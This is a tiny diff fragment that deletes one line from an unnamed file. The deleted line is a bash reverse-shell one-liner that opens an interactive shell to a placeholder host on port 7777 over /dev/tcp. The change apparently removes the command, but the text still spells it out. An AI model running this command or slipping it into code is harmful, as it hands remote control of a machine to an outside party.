@@ -1,1 +1,0 @@
-bash -i 0>& /dev/tcp/X.X.X.X/7777 0>&1
